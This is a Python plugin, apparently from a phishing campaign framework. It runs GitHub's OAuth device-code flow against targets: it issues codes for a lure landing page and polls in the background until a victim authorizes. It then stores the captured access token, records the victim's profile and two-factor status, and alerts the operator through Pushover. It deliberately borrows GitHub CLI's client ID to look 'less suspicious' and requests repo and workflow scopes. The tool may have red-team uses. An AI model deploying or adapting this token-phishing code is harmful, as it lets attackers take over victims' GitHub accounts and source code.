"""
GitHub Device Code plugin - OAuth 2.0 Device Authorization Grant (RFC 8628)
Generates GitHub device codes and polls for access tokens.
"""
from typing import Dict, Any, Optional, List
from threading import Thread
from datetime import datetime
from ..base import BasePlugin
from shared.config import Config
import logging
import requests
import time

logger = logging.getLogger(__name__)

# GitHub CLI's public OAuth client_id — shows "GitHub CLI" on the auth page
GITHUB_CLI_CLIENT_ID = '178c6fc778ccc68e1d6a'


class GitHubDeviceCodePlugin(BasePlugin):
    """
    Plugin for GitHub OAuth Device Code phishing flow.

    Initiates the GitHub device authorization grant: generates a device code,
    returns the user_code to the landing page via JSON, and polls for the
    access token in a background thread. Captured tokens are logged as Events
    and optionally trigger a Pushover notification.

    Workflow setup:
    - GET workflow: RenderTemplate with the GitHub verification portal template
    - POST workflow: This plugin (returns JSON to the landing page JS)

    The landing page JS POSTs visitor data (email, etc.) as JSON to the
    campaign URL. This plugin reads that JSON, generates a device code,
    and returns {user_code, verification_uri, expires_in} for the page
    to display.
    """

    @property
    def plugin_type(self) -> str:
        return "github_device_code"

    @property
    def display_name(self) -> str:
        return "GitHub Device Code"

    @property
    def description(self) -> str:
        return (
            "Generate GitHub device codes for OAuth 2.0 device authorization flow. "
            "Returns a user_code as JSON for the landing page to display. "
            "Polls GitHub in the background and captures the access token when "
            "the target authorizes. Requires a GitHub OAuth App client ID."
        )

    @property
    def plugin_category(self) -> str:
        return "data_transform"

    @property
    def config_schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "client_id": {
                    "type": "string",
                    "title": "GitHub OAuth Client ID",
                    "description": "Client ID for the device code flow (optional — defaults to GitHub CLI)",
                    "help": (
                        "Any public GitHub OAuth App client_id works. Leave blank to use "
                        "GitHub CLI's client_id, which shows 'GitHub CLI' on the authorization "
                        "page (less suspicious). To use a custom app name, register your own "
                        "OAuth App at Settings > Developer settings > OAuth Apps."
                    ),
                    "placeholder": "Leave blank for GitHub CLI default"
                },
                "scopes": {
                    "type": "string",
                    "title": "OAuth Scopes",
                    "description": "Space-separated OAuth scopes to request",
                    "help": (
                        "Scopes control what the captured token can access. "
                        "Common scopes: repo (full repo access), user (profile info), "
                        "workflow (GitHub Actions), read:org (org membership), "
                        "gist, notifications. See GitHub docs for the full list."
                    ),
                    "placeholder": "repo user workflow read:org",
                    "default": "repo user workflow"
                },
                "github_url": {
                    "type": "string",
                    "title": "GitHub Base URL",
                    "description": "GitHub base URL (change for GHE instances)",
                    "help": (
                        "Use https://github.com for github.com or "
                        "https://github.your-company.com for GitHub Enterprise."
                    ),
                    "placeholder": "https://github.com",
                    "default": "https://github.com"
                },
                "timeout": {
                    "type": "integer",
                    "title": "Polling Timeout (seconds)",
                    "description": "How long to poll before giving up",
                    "help": "GitHub device codes expire after ~15 minutes (900s). Default: 900.",
                    "default": 900
                },
                "poll_interval": {
                    "type": "integer",
                    "title": "Poll Interval (seconds)",
                    "description": "Seconds between token poll requests",
                    "help": "GitHub's minimum is 5 seconds. Lower values will be throttled.",
                    "default": 5
                }
            },
            "required": []
        }

    def execute(self, context: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        from flask import request as flask_request, current_app
        from shared.database import db, Event

        try:
            client_id = config.get('client_id', '').strip() or GITHUB_CLI_CLIENT_ID

            scopes = config.get('scopes', 'repo user workflow')
            github_url = config.get('github_url', 'https://github.com').rstrip('/')
            timeout = config.get('timeout', 900)
            poll_interval = config.get('poll_interval', 5)

            visitor_data = flask_request.get_json(silent=True) or {}
            email = visitor_data.get('email', '')

            code_data = self._request_device_code(github_url, client_id, scopes)
            if not code_data or 'user_code' not in code_data:
                logger.error("Failed to get device code from GitHub")
                context['_response_json'] = {'status': 'error', 'message': 'Failed to generate device code'}
                context['_response_status'] = 500
                return context

            user_code = code_data['user_code']
            device_code = code_data['device_code']
            verification_uri = code_data.get('verification_uri', f'{github_url}/login/device')
            expires_in = code_data.get('expires_in', 900)
            interval = max(code_data.get('interval', poll_interval), poll_interval)

            campaign_id = context.get('campaign', {}).get('id')
            ip_address = flask_request.remote_addr
            user_agent = flask_request.headers.get('User-Agent', '')
            session_id = context.get('session', {}).get('session_id')

            try:
                event = Event(
                    campaign_id=campaign_id,
                    event_type='device_code_issued',
                    data={
                        'provider': 'github',
                        'email': email,
                        'user_code': user_code,
                        'scopes': scopes,
                        'expires_in': expires_in,
                        'visitor_data': {
                            k: v for k, v in visitor_data.items()
                            if k not in ('email',)
                        },
                        'issued_at': datetime.utcnow().isoformat()
                    },
                    ip_address=ip_address,
                    user_agent=user_agent,
                    session_id=session_id
                )
                db.session.add(event)
                db.session.commit()
            except Exception as e:
                logger.warning(f"Failed to log device_code_issued event: {e}")
                db.session.rollback()

            app = current_app._get_current_object()
            self._start_polling_thread(
                app=app,
                github_url=github_url,
                client_id=client_id,
                device_code=device_code,
                interval=interval,
                timeout=timeout,
                email=email,
                campaign_id=campaign_id,
                ip_address=ip_address,
                user_agent=user_agent,
                session_id=session_id,
                visitor_data=visitor_data,
                scopes=scopes
            )

            context['_response_json'] = {
                'status': 'success',
                'user_code': user_code,
                'verification_uri': verification_uri,
                'expires_in': expires_in
            }
            logger.info(f"Device code issued for {email or 'unknown'}: {user_code}")

        except Exception as e:
            logger.error(f"GitHub device code execution failed: {e}", exc_info=True)
            context['_response_json'] = {'status': 'error', 'message': 'Internal error'}
            context['_response_status'] = 500
            return self.on_error(e, context, config)

        return context

    def _request_device_code(
        self, github_url: str, client_id: str, scopes: str
    ) -> Optional[Dict[str, Any]]:
        try:
            resp = requests.post(
                f'{github_url}/login/device/code',
                data={'client_id': client_id, 'scope': scopes},
                headers={'Accept': 'application/json'},
                timeout=10
            )
            resp.raise_for_status()
            return resp.json()
        except requests.RequestException as e:
            logger.error(f"GitHub device code request failed: {e}")
            return None

    def _start_polling_thread(self, **kwargs):
        thread = Thread(target=self._poll_for_token, kwargs=kwargs, daemon=True)
        thread.start()

    def _poll_for_token(
        self,
        app,
        github_url: str,
        client_id: str,
        device_code: str,
        interval: int,
        timeout: int,
        email: str,
        campaign_id: int,
        ip_address: str,
        user_agent: str,
        session_id: Optional[str],
        visitor_data: dict,
        scopes: str
    ):
        from shared.database import db, Event

        headers = {'Accept': 'application/json'}
        poll_data = {
            'client_id': client_id,
            'device_code': device_code,
            'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
        }

        elapsed = 0
        current_interval = interval

        with app.app_context():
            while elapsed < timeout:
                time.sleep(current_interval)
                elapsed += current_interval

                try:
                    resp = requests.post(
                        f'{github_url}/login/oauth/access_token',
                        data=poll_data,
                        headers=headers,
                        timeout=10
                    )
                    data = resp.json()

                    if 'access_token' in data:
                        access_token = data['access_token']
                        token_type = data.get('token_type', 'bearer')
                        granted_scopes = data.get('scope', scopes)

                        github_user = self._fetch_github_user(github_url, access_token)

                        try:
                            event = Event(
                                campaign_id=campaign_id,
                                event_type='token_captured',
                                data={
                                    'provider': 'github',
                                    'email': email,
                                    'access_token': access_token,
                                    'token_type': token_type,
                                    'scopes': granted_scopes,
                                    'github_user': github_user,
                                    'visitor_data': visitor_data,
                                    'captured_at': datetime.utcnow().isoformat()
                                },
                                ip_address=ip_address,
                                user_agent=user_agent,
                                session_id=session_id
                            )
                            db.session.add(event)
                            db.session.commit()
                        except Exception as e:
                            logger.error(f"Failed to log token_captured event: {e}")
                            db.session.rollback()

                        login = github_user.get('login', 'unknown') if github_user else 'unknown'
                        logger.info(f"TOKEN CAPTURED for {email} (GitHub user: {login})")

                        self._send_notification(email, login, granted_scopes, campaign_id)
                        return

                    error = data.get('error', '')
                    if error == 'authorization_pending':
                        continue
                    elif error == 'slow_down':
                        current_interval += 5
                        logger.debug(f"Slowing poll interval to {current_interval}s for {email}")
                    elif error in ('expired_token', 'access_denied'):
                        logger.info(f"Device code {error} for {email}")
                        self._log_expiry_event(
                            campaign_id, email, error, ip_address, user_agent, session_id
                        )
                        return
                    else:
                        logger.error(f"Unexpected poll error for {email}: {error}")
                        self._log_expiry_event(
                            campaign_id, email, error or 'unknown_error',
                            ip_address, user_agent, session_id
                        )
                        return

                except requests.RequestException as e:
                    logger.error(f"Poll request failed for {email}: {e}")
                    continue

            logger.info(f"Device code polling timed out for {email}")
            self._log_expiry_event(
                campaign_id, email, 'timeout', ip_address, user_agent, session_id
            )

    def _fetch_github_user(self, github_url: str, access_token: str) -> Optional[Dict[str, Any]]:
        if github_url.rstrip('/') == 'https://github.com':
            api_url = 'https://api.github.com/user'
        else:
            api_url = f'{github_url.rstrip("/")}/api/v3/user'

        try:
            resp = requests.get(
                api_url,
                headers={
                    'Authorization': f'Bearer {access_token}',
                    'Accept': 'application/json'
                },
                timeout=10
            )
            if resp.status_code == 200:
                user = resp.json()
                return {
                    'login': user.get('login'),
                    'name': user.get('name'),
                    'email': user.get('email'),
                    'company': user.get('company'),
                    'id': user.get('id'),
                    'html_url': user.get('html_url'),
                    'two_factor_authentication': user.get('two_factor_authentication')
                }
        except requests.RequestException as e:
            logger.warning(f"Failed to fetch GitHub user profile: {e}")
        return None

    def _log_expiry_event(
        self, campaign_id, email, reason, ip_address, user_agent, session_id
    ):
        from shared.database import db, Event
        try:
            event = Event(
                campaign_id=campaign_id,
                event_type='device_code_expired',
                data={
                    'provider': 'github',
                    'email': email,
                    'reason': reason,
                    'expired_at': datetime.utcnow().isoformat()
                },
                ip_address=ip_address,
                user_agent=user_agent,
                session_id=session_id
            )
            db.session.add(event)
            db.session.commit()
        except Exception as e:
            logger.warning(f"Failed to log device_code_expired event: {e}")
            db.session.rollback()

    def _send_notification(self, email: str, github_login: str, scopes: str, campaign_id: int):
        try:
            api_token = Config.get_setting('PUSHOVER_API_TOKEN', '')
            user_key = Config.get_setting('PUSHOVER_USER_KEY', '')
            if not api_token or not user_key:
                return

            message = (
                f"GitHub token captured!\n"
                f"Email: {email}\n"
                f"GitHub user: {github_login}\n"
                f"Scopes: {scopes}\n"
                f"Campaign ID: {campaign_id}"
            )

            requests.post(
                'https://api.pushover.net/1/messages.json',
                data={
                    'token': api_token,
                    'user': user_key,
                    'title': 'GitHub Token Captured',
                    'message': message,
                    'priority': 1
                },
                timeout=10
            )
        except Exception as e:
            logger.warning(f"Failed to send Pushover notification: {e}")

    def validate_config(self, config: Dict[str, Any]) -> Optional[List[str]]:
        return None
